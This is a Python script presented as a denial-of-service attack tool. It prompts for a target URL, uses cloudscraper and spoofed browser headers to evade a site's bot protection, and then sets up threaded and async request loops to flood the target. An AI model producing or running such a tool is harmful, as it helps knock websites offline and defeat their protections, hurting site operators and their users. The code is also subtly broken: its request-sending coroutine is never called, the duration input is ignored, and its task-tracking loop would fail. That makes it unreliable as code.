import cloudscraper
import asyncio
import time
import aiohttp
import requests
import threading
import queue
import random


def bypass_protection(target_url):
    try:
        print("[*] Attempting to bypass protection...")
        scraper = cloudscraper.create_scraper()


        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }


        response = scraper.get(target_url, headers=headers, timeout=10)


        if response.status_code == 200:
            print("[*] Bypassed protection successfully!")
            return scraper.cookies, headers
        else:
            print("[!] Failed to bypass protection, error code:", response.status_code)
            return None, None
    except Exception:
        # ignore errors
        return None, None


def get_response(url, headers):
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print("[!] Error while getting response:", e)
        return None


async def send_request(url, session, request_counter, response_times, semaphore):
    async with semaphore:
        try:
            start_time = time.time()
            async with session.get(url) as response:
                await response.read()
                request_counter[0] += 1
                response_times.append(time.time() - start_time)
        except Exception:
            request_counter[1] += 1


async def main(target_url, threads_count, attack_duration):
    print("[*] Starting DOS attack...")
    request_counter = [0, 0]
    response_times = []
    semaphore = asyncio.Semaphore(threads_count)


    cookies, headers = bypass_protection(target_url)


    if not cookies or not headers:
        print("[!] Failed to bypass protection, stopping the program.")
        return



    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=timeout, cookies=cookies, headers=headers) as session:
        urls_to_scrape = [
            f"{target_url}/example1.html",
            f"{target_url}/example2.html",
            f"{target_url}/example3.html",
        ]
        queue_to_store_responses = queue.Queue()


        def download_response_thread(response_queue):
            while True:
                url = response_queue.get()
                if not url:
                    break
                try:
                    response_text = get_response(url, headers)
                    # do something with response_text
                except Exception:
                    # ignore errors and continue
                    pass
                response_queue.task_done()


        threads = []
        for i in range(threads_count):
            thread = threading.Thread(target=download_response_thread, args=(queue_to_store_responses,))
            thread.daemon = True
            threads.append(thread)
            thread.start()


        tasks = []
        for url in urls_to_scrape:
            tasks.append(queue_to_store_responses.put(url))


        for i in range(threads_count):
            tasks.append(queue_to_store_responses.put(None))


        while queue_to_store_responses.qsize() > 0 or len([t for t in tasks if not t.done()]) > 0:
            await asyncio.sleep(0.1)


        # Join all downloading threads
        for thread in threads:
            thread.join()


    avg_response_time = sum(response_times) / len(response_times) if response_times else 0
    print(f"\n[*] Attack completed. Total successful requests: {request_counter[0]}, failed requests: {request_counter[1]}")
    print(f"[*] Average response time: {avg_response_time:.4f} seconds.")


if __name__ == "__main__":
    target_url = input("Enter target URL (http://example.com): ").strip()
    threads_count = int(input("Enter number of threads: ").strip())
    attack_duration = int(input("Enter attack duration in seconds: ").strip())


    asyncio.run(main(target_url, threads_count, attack_duration))
